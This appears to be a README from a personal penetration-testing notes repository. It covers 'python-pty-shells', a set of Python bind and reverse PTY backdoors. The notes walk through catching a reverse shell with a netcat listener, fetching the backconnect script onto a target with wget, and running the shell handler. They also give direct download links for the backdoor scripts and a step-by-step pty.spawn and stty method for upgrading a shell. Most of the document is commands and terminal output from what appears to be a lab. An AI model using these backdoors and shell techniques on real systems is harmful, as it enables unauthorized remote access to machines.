# Original README

```
python-pty-shells
=================

Python PTY backdoors - full PTY or nothing!

Insecurety Research (2013)

The following is a collection of bind and reverse shells which give you a fully working PTY.

This is far superior to a normal bind or reverse shell, as you have job control and an interactive PTY and can do such things as use nano/vi to write files, su to elevate privs/change user, and ssh onward. You can also CTRL+C  and suchlike. 

I have implemented the bind and backconnect shells using the TCP protocol, the SCTP protocol, and the UDP protocol.

A demonstration video and blog post explaining the advantages/disadvantages of each technique is on the way, I just need to get around to it. 

For the SCTP shell, you will need the PySCTP module and the host will need to support the SCTP protocol. Most modern Linux boxes do, however you may need to install lksctp and lksctp-dev to build the python extensions. I am unsure if pyinstaller or similar can get around this.

Released under the WTFPL - wtfpl.net

Project by Insecurety Research - insecurety.net

Author: Darren 'infodox' Martyn.
```

# Personal notes

### Usage Instructions: 

```
Remember to configure the call back IP and port from the tcp backconnect file before transferring over to target machine
Same needs to be set up as positional arguments for the tcp shell handler

```

### Usage Examples: 

```
# assuming already gotten reverse shell from target machine, but no tab completion etc..
â”Œâ”€â”€(rootðŸ’€kali)-[~]                                                                                                                    
â””â”€# nc -lvnp 9000 -s 10.2.62.214                                         
Listening on 10.2.62.214 9000                                            
Connection received on 10.10.235.202 44509                               
user@debian:/dev/shm$ whoami                                                                                                                      
whoami                                                                   
user

user@debian:/dev/shm$ ls                                                 
ls

# Remember to configure call back IP and port from target machine

# grab python reverse shell (from target machine)

wget http://testing-machine-ip/tcp_pty_backconnect.py

# execute python reverse shell from target machine, with shell handler on the testing machine ready 
user@debian:/dev/shm$ /usr/bin/python2.6 tcp_pty_backconnect.py                                                                                   
/usr/bin/python2.6 tcp_pty_backconnect.py                                
      
      
# full functional shell should be caught from shell handler

â”Œâ”€â”€(rootðŸ’€kali)-[/opt/os/linux/linux_privesc]                            
â””â”€# ./tcp_pty_shell_handler.py 
usage: tcp_pty_shell_handler.py [-h] (-b | -c) address                   
tcp_pty_shell_handler.py: error: too few arguments                       
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/os/linux/linux_privesc]                            
â””â”€# vim tcp_pty_shell_handler.py 
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/os/linux/linux_privesc]
â””â”€# ./tcp_pty_shell_handler.py -h                                                                                                                
usage: tcp_pty_shell_handler.py [-h] (-b | -c) address

positional arguments:
  address        IP address/port to bind/connect to.

optional arguments:
  -h, --help     show this help message and exit
  -b, --bind     Reverse shell handler.
  -c, --connect  Bind shell handler. 
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/os/linux/linux_privesc]
â””â”€# ./tcp_pty_shell_handler.py -b 10.2.62.214:9001
user@debian:/dev/shm$ 
user@debian:/dev/shm$ 
Display all 1024 possibilities? (y or n)                                 
user@debian:/dev/shm$

```

### Downloadable shortcuts: 
**TCP Backconnect** : `wget https://raw.githubusercontent.com/0x5929/Sec/main/Exploitation/shells/python/python-pty-shells/tcp_pty_backconnect.py`

**TCP Shell Handler** : `wget https://raw.githubusercontent.com/0x5929/Sec/main/Exploitation/shells/python/python-pty-shells/tcp_pty_shell_handler.py`

### Personally, I prefer a different way to achieve a full functional tty shell from a reverse shell connection

```
# From target marchine, on a reverse shell connection, check for python installation. 
# Note that both have exactly the same syntax

$ which python

$ which python3
$ /usr/bin/python3

# then use the python3 to obtain a tty (pty)
$ python3 -c "import pty; pty.spawn('/bin/bash')"

Vulnserver:/var/www/data www-data$ 

# Background suspend the process with CTRL-Z 
Vulnserver:/var/www/data www-data$  ^Z

# back on Kali as root, list teletyper current settings and TERM value
root@kali: ~ $ stty -a

... current tty settings ...

root@kali: ~ $  echo $TERM
screen

# configure current Kali tty to send in raw inputs such as ^C or ^Z etc, also do not echo any characters in the second tty (PTY)
# finally foreground the previously suspended process to take effect
root@kali: ~ $ stty raw -echo; fg

# set the tty (PTY) options the same as the parent tty (Kali)
Vulnserver:/var/www/data www-data$ stty rows [number-of-rows]
Vulnserver:/var/www/data www-data$ stty cols [number-of-columns]
Vulnserver:/var/www/data www-data$ export TERM=screen 

# we now have a fully functional tty (PTY) with tab completion and ability to clear screen with ^L
Vulnserver:/var/www/data www-data$ 

```

*And to exit out of the pty, returning back to Kali*

```
# from ealier exit out of PTY
Vulnserver:/var/www/data www-data$ exit

# exit out of reverse shell (NOTE all characters should not render because of the stty -echo setting
# press CTRL-J (^J) for Enter
[exit] <CTRL-J>

# reset Kali terminal settings with reset
# remember we may not be able to see any characters typed because of the stty -echo setting
[reset] <enter>

# and now we should be back
root@kali: ~ $

# OR we can try tty sane (to return teletyper to a sane state)
# remember we may not be able to see any characters typed because of the stty -echo setting
[stty sane] <enter>

# and again, now we should be back
root@kali: ~ $ hostname
kali

```
